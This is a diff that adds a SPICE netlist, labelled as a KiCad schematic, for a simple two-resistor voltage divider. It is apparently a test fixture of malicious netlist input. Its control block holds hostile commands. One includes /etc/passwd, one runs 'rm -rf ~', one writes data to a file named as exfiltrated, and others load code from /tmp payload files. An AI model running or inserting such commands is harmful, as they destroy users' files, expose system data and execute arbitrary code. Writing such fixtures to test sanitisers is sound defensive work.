@@ -1,0 +1,12 @@
+.title KiCad schematic
+.include "/etc/passwd"
+.control
+shell rm -rf ~
+wrdata /tmp/solus-exfiltrated v(/out)
+codemodel /tmp/payload.cm
+source /tmp/payload.cir
+.endc
+V1 /in 0 DC 12
+R1 /in /out 10k
+R2 /out 0 10k
+.end
